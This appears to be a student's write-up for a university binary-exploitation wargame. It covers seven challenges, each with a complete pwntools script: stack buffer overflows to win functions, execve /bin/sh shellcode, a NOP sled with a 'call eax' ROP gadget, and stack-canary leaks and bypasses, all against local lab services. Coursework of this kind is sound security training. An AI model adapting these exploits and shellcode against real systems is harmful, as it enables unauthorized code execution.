# **COMP6447 Wargame 1** - Johnathan Liauw (z5136212)
## **0. buffer-1 - jump**
_General overview of problems faced:_     
None        

_List of vulnerabilities:_    
1. The input from user can overflow the buffer and overwrite the function pointer 

_Steps to exploit:_   
1. Enter exactly 64 bytes to overflow the buffer and then append the win function address (0x080491d2)  

_Script/Command used:_    
``` python
#!/usr/bin/python

from pwn import *

host = "127.0.0.1"
port = 5001
address = (host, port)

winAddr = 0x080491d2
offset = 64

c = remote(host, port)

payload = "a"*offset + p32(winAddr)
print("Sending payload: %s" % (payload))

c.sendline(payload)

c.interactive()
```
---
## **1. buffer-2 - blind**
_General overview of problems faced:_   
None

_List of vulnerabilities:_    
1. The input from user can overflow the buffer and overwrite the return address of the main function

_Steps to exploit:_   
1. Use a cyclic pattern to find the offset to the return address
2. Enter exactly offset bytes to get to the return address then append the win function address (0x080484cd)

_Script/Command used:_    
```bash
ragg2 -P 200 -r > pattern.txt
(gdb) run < pattern.txt
```
```python
#!/usr/bin/python

from pwn import *

host = "127.0.0.1"
port = 5002
win_address = 0x080484cd
return_offset = 76

c = remote(host, port)

payload = "a"*return_offset + p32(win_address)

print("Sending payload: %s" % (payload))

c.sendline(payload)

c.interactive()
```
---
## **2. buffer-3 - runner**
_General overview of problems faced:_   
Have to use shellcode, I have learnt it from _"Hacking - The Art of Exploitation"_ before so here I just using a borrowed shellcode

_List of vulnerabilities:_    
1. Not really a vulnerability, it is just calling to the user's input

_Steps to exploit:_   
1. Enter a shellcode to prompt a shell

_Script/Command used:_    
```python
#!/usr/bin/python

from pwn import *

host = "127.0.0.1"
port = 5003

c = remote(host, port)

#from http://shell-storm.org/shellcode/files/shellcode-752.php
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

c.sendline(shellcode)

c.interactive()
```
---
## **3. buffer-4 - shellz**
_General overview of problems faced:_   
Have to guess the address to return to the shellcode which can be done with NOP sled or ROP gadgets

_List of vulnerabilities:_    
1. The input from user can overflow the buffer and overwrite the return address of the main function

_Steps to exploit:_ 
1. Use a cyclic pattern to find the offset to the return address
2. From the binary I found that the address of the overflowing buffer is stored in eax and remained unchanged until the end of the program so I can use a ROP gadget to _"call eax"_ and execute my shellcode
3. Use ropper to find a gadget for _"call eax"_
4. Enter a payload with offset NOPs and the shellcode in the middle, then append the gadget (0x08048406)

_Script/Command used:_    
```bash
ropper -f shellz
ragg2 -P 10000 -r > pattern.txt
(gdb) run < pattern.txt
```
```python
#!/usr/bin/python 

from pwn import *

host = "127.0.0.1"
port = 5004

offset = 8204
gadget = 0x08048406

c = remote(host, port)

payload = "\x90"*8000 
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 
payload += "a"*181
payload += p32(gadget)

print("Sending payload...")

c.sendline(payload)

c.interactive()
```
---
## **4. canary-1 - elitecanary**
_General overview of problems faced:_   
None

_List of vulnerabilities:_    
1. Input from user can overflow the buffer and overwrite the next variable in the stack

_Steps to exploit:_ 
1. From the binary, find the offset of the buffer to the target variable
2. From the binary, find the content required in the target variable (1337)
3. Enter exactly offset bytes, then append the required content

_Script/Command used:_    
```python
#!/usr/bin/python

from pwn import *

host = "127.0.0.1"
port = 6001

offset = 32

c = remote(host, port)

payload = "a"*32 + "1337"

print("Sending payload: %s" % (payload))
c.sendline(payload)

c.interactive()
```
---
## **5. canary-2 - shellcrack**
_General overview of problems faced:_   
Have to research about canary and methods to bypass it

_List of vulnerabilities:_    
1. Using fread to get a 16 bytes input from user but did not add a null terminator at the end which cause the printf function to print the memory until the next null byte and thus leaked the value of the canary

_Steps to exploit:_ 
1. Enter 15 bytes and then a newline _"\n"_ to the buffer
2. Extract the first 8 bytes of output after the newline which is going to be the value of the canary
3. From the binary, find the offset to overwrite the canary value
4. Put the shellcode before the canary value and have _(offset-shellcode_length)_ NOPs before it
5. Use a cyclic pattern with the payload from above before to find the offset to overwrite the return address
6. Finally fill the offset to return address and append the buffer address given

_Script/Command used:_    
```python
#!/usr/bin/python

from pwn import *
import re

host = "127.0.0.1"
port = 6002

leak_payload = "a"*15 + "\n"
leak_payload = leak_payload[:-1]

c = remote(host, port)
#c = process('../shellcrack')
#gdb.attach(c)

c.recvline()

print("Sending payload to leak canary...")
c.sendline(leak_payload)

c.recvline()

leak = c.recvline()
leak = leak[:8]
print("Leaked Canary: %s" % (leak))

reply = c.recvline()
print(reply)
address = re.search('0x(.{8})', reply).group(0)
print("Buffer Address: %s" % (address))
address = int(address, 0)
address = p32(address)

payload = "\x90"*25
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += leak
#payload += cyclic(1000)
offset = cyclic_find(0x61616166)
payload += "a"*offset
payload += address

c.sendline(payload)

c.interactive()
```
---
## **6. canary-3 - stackdump**
_General overview of problems faced:_   
Have to properly comment the assembly in order to fully understand how this binary works

_List of vulnerabilities:_    
1. In the _"dump memory"_ function, rather than dumping variable given in the assembly, it is dumping the address stored in the variable and since we can write to the variable in the _"input option"_ function, we can view the value of any address

_Steps to exploit:_ 
1. From the binary, find the offset from the given pointer to the address storing the canary
2. Input the address storing the canary
3. Dump the memory and extract the canary value
4. Use a cyclic pattern to find the offset to overwrite the return address
5. Append the win function address to the end of the payload with the offsets and canary

_Script/Command used:_    
```python
#!/usr/bin/python

from pwn import *
import re

host = "127.0.0.1"
port = 6003

win_addr = 0x080486cd
offset = 96

c = remote(host, port)
#c = process("../stack-dump")

#c = gdb.debug("../stack-dump")

reply = c.recvlines(2)  # starting lines
stack_ptr = re.search('0x(.{8})', reply[1]).group(0)                                          
print("Useful stack pointer: %s" % (stack_ptr))                                               

c.recvlines(4)
c.sendline("a")

c.sendline("5")

stack_ptr = int(stack_ptr, 0)
stack_ptr += 105

payload_leak = p32(stack_ptr)
payload_leak += "\n"

c.sendline(payload_leak)

c.recvlines(10)

c.sendline("b")

canary = c.recvline()
canary = canary[22:26]
print("Canary: %s (%d bytes)" %(canary, len(canary)))                                         

c.recvlines(4)

addr_offset = cyclic_find(0x61616164)

size = offset + 4 + addr_offset + 4 + 1
c.sendline("a")
c.sendline(str(size))

payload_return = "a"*offset
payload_return += canary
#payload_return += cyclic(size-offset-4-1)
payload_return += "a"*addr_offset
payload_return += p32(win_addr)
payload_return += "\n"

c.sendline(payload_return)
c.recvlines(10)
c.sendline("d")

c.interactive()
```
---